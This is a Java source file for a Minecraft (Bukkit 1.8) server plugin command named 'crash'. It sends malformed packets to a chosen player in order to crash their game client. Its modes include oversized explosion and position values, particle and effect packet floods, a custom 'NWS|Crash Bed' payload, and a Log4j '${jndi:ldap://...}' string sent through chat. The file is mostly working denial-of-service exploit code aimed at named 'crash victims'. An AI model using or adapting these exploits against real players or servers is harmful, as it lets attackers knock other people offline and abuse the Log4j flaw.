package me.killstorm103.Rebug.Commands;

import java.util.ArrayList;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Main.Command;
import me.killstorm103.Rebug.Utils.PT;
import net.minecraft.server.v1_8_R3.*;

public class Crasher extends Command
{

	@Override
	public String getName() {
		return "crash";
	}

	@Override
	public String getSyntax() {
		return "crash <Crash Exploit> <Crash Victim> ...";
	}

	@Override
	public String getDescription() {
		return "crash players or the server";
	}
	@Override
	public String getPermission() {
		return StartOfPermission() + "crasher";
	}
	@Override
	public void onCommand(CommandSender sender, String[] args) throws Exception 
	{
		Player Crash_Victim = null;
		if (args.length < 1)
		{
			Log(sender, getSyntax());
			return;
		}
		String mode = args[1];
		if (mode == null || mode.length() < 1)
		{
			Log(sender, getSyntax());
			return;
		}
		Packet<?> packet = null;
		if (args.length < 2)
		{
			sender.sendMessage(getSyntax());
			return;
		}
		
		Crash_Victim = getRebug().getServer().getPlayer(args[2]); 
		if (Crash_Victim == null)
		{
			Log(sender, "Unknown Player!");
			return;
		}
		if (mode.equalsIgnoreCase("Server")) // Test in dev
		{
			Log(sender, "trying Server Crasher!");
		}
		if (mode.equalsIgnoreCase("NumbWare"))
		{
			packet = new PacketPlayOutCustomPayload("NWS|Crash Bed",
		    new PacketDataSerializer(Unpooled.buffer()));
			PT.SendPacket(Crash_Victim, packet);
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Explosion"))
		{
            packet = new PacketPlayOutExplosion(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ()));
            PT.SendPacket(Crash_Victim, packet);
            Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Particle"))
		{
			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
			
            for (int i = 0; i < EnumParticle.values().length; i ++)
            {
            	packet = new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0});
                PT.SendPacket(Crash_Victim, packet);
            }
            Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("GameState"))
		{
			packet = new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500)));
			PT.SendPacket(Crash_Victim, packet);
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Log4j"))
		{
			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
			packet = new PacketPlayOutChat (text, (byte) 1);
			PT.SendPacket(Crash_Victim, packet);
			Log(sender, "Tried using the Log4j Crash Exploit on " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("Position"))
		{
			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
			{
				packet =
				new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i));
				PT.SendPacket(Crash_Victim, packet);
			}
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("illegalEffect") || mode.equalsIgnoreCase("Effect"))
		{
			packet = new PacketPlayOutEntityEffect (Crash_Victim.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true));
			for (int i = 0; i < Integer.MAX_VALUE; i++)
				PT.SendPacket(Crash_Victim, packet);
			
			Log(sender, "trying to use test crash Exploit on " + Crash_Victim.getName());
		}
		if (mode.equalsIgnoreCase("SpawnEntity") || mode.equalsIgnoreCase("Entity"))
		{
			if (args.length < 3)
			{
				sender.sendMessage("/rebug crash spawnentity/entity <player> <spawn entity>");
				return;
			}
			PT.CrashPlayer(sender, Crash_Victim, args[3]);
			Log(sender, "tried crashing " + Crash_Victim.getName());
		}
	}
}
